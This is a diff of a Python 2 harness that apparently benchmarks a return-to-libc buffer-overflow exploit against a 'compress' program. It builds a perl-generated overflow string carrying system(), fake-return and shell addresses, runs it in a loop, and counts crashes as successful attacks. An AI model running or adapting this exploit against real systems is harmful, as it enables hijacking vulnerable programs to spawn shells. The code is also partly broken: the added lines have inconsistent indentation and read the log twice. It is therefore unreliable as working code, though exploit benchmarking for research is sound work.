@@ -79,50 +79,38 @@ for address in addresses:
         else:
                 shell_address = "\\x" + address[7:9] + "\\x" +  address[5:7] + "\\x" +  address[3:5] + "\\x0" + address[2:3]
                 print "shell address: " + shell_address
-        #print "address {} length {}".format(address, len(address))
-                #int_shell_address = int(shell_address,16)
-                #print "int address {}".format(int_shell_address)
 
 while i < repeat_times:
         i += 1
 
-        #os.system("rm " + app_name[0] + "/bench_log")
+        os.system("rm " + bench_eval_directory + "bench_log")
         cmdline = source_directory + "compress `perl -e 'print \"A\"x1052 . " + "\"" + system_address + "\"" + \
         " . " + "\"" + fake_address + " . " + "\"" + " . " + "\"" + shell_address + "\"" + ";'`" + " > " + bench_eval_directory + "bench_log 2>&1 &"
         print cmdline
-
         
         os.system(cmdline)
         log = open(bench_eval_directory + "bench_log","r")
 
-        #if log.read().find("Impossible") != -1:
-        #        print cmdline,"\t\t","NOT POSSIBLE"
-        #        attack_possible = 0;
-        #        break;	#Not possible once, not possible always :)
+        if log.read().find("File name too long") != -1:
+                print cmdline,"\t\t","POSSIBLE"
+                attack_possible = 1;
+                break;	
 
+        if log.read().find("Segmentation fault") != -1:
+                print "Segmentation Fault"
+                attack_possible = 1;
+                break;	
+        
+         s_attempts += 1
 
-        #if os.path.exists("/bench-eval/f_xxxx"):
-        #        s_attempts += 1		
-        #        os.system("rm /becnh-eval/f_xxxx")
-       
+         if attack_possible == 0:
+                 total_np += 1;
+                 continue
+         else:
+                 total_ok = total_ok + 1                 						
 
-#if attack_possible == 0:
-#        total_np += 1;
-#        continue
-
-#if s_attempts == repeat_times:
-#        print cmdline,"\t\tOK\t", s_attempts,"/",repeat_times
-#        total_ok += 1;
-#elif s_attempts == 0:
-#        print cmdline,"\t\tFAIL\t",s_attempts,"/",repeat_times
-#        total_fail += 1;
-#else:
-#        print cmdline,"\t\tSOMETIMES\t", s_attempts,"/",repeat_times
-#        total_some +=1;
-						
-
-#total_attacks = total_ok + total_some + total_fail + total_np;
-#print "\n||Summary|| OK: ",total_ok," ,SOME: ",total_some," ,FAIL: ",total_fail," ,NP: ",total_np," ,Total Attacks: ",total_attacks
+total_attacks = total_ok + total_some + total_fail + total_np;
+print "\n||Summary|| OK: ",total_ok," ,SOME: ",total_some," ,FAIL: ",total_fail," ,NP: ",total_np," ,Total Attacks: ",total_attacks
 
 						
 					
